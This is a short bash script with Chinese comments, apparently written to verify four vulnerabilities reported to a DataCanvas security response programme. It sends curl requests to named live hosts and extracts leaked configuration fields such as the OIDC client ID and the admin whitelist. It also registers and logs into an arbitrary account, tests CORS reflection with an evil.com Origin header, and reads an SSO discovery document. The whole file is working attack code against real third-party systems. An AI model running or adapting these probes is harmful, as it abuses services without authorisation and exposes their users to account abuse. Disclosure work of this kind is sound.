#!/bin/bash
# DataCanvas SRC 漏洞一键验证脚本
# 用法: bash /tmp/datacanvas_verify.sh
# 注意: 必须用 -4 强制IPv4 + --connect-timeout 防止卡住

CURL="curl -sk --connect-timeout 10 --max-time 20 -4"

echo "=== 漏洞1: codingplan.alayanew.com 配置信息泄露 ==="
R1=$($CURL "https://codingplan.alayanew.com/api/status" 2>/dev/null)
if [ -n "$R1" ]; then
    echo "[OK] 可达"
    echo "$R1" | grep -oP '"oidc_client_id":"[^"]*"'
    echo "$R1" | grep -oP '"tenant_admin_whitelist":"[^"]*"'
    echo "$R1" | grep -oP '"password_register_enabled":[a-z]*'
    echo "$R1" | grep -oP '"email_verification":[a-z]*'
    echo "$R1" | grep -oP '"turnstile_check":[a-z]*'
else
    echo "[FAIL] 超时，浏览器打开 https://codingplan.alayanew.com/api/status"
fi

echo ""
echo "=== 漏洞2: codingplan.alayanew.com 任意注册 ==="
RAND="vfy$RANDOM"
R2=$($CURL -X POST "https://codingplan.alayanew.com/api/user/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$RAND\",\"password\":\"Vfy12345!\",\"email\":\"$RAND@t.c\"}" 2>/dev/null)
if echo "$R2" | grep -q '"success":true'; then
    echo "[OK] 注册成功 用户名=$RAND"
    R2L=$($CURL -X POST "https://codingplan.alayanew.com/api/user/login" \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$RAND\",\"password\":\"Vfy12345!\"}" 2>/dev/null)
    echo "$R2L" | grep -oP '"id":[0-9]*'
    echo "$R2L" | grep -oP '"role":[0-9]'
else
    echo "[FAIL] $R2"
fi

echo ""
echo "=== 漏洞3: apps.datacanvas.com CORS反射 ==="
R3=$($CURL -D /tmp/cors_hdr.txt -o /dev/null -H "Origin: https://evil.com" "https://apps.datacanvas.com/api/user" 2>/dev/null)
if grep -q 'access-control-allow-origin: https://evil.com' /tmp/cors_hdr.txt 2>/dev/null; then
    echo "[OK] CORS反射确认"
    grep 'access-control-allow-origin' /tmp/cors_hdr.txt
else
    echo "[FAIL]"
fi

echo ""
echo "=== 漏洞4: sso.alayanew.com OIDC泄露 ==="
R4=$($CURL "https://sso.alayanew.com/.well-known/openid-configuration" 2>/dev/null)
if echo "$R4" | grep -q 'sso.alayanew.com'; then
    echo "[OK] OIDC配置泄露"
    echo "$R4" | grep -oP '"issuer":"[^"]*"'
    echo "$R4" | grep -oP '"grant_types_supported":\[[^\]]*\]'
else
    echo "[FAIL]"
fi
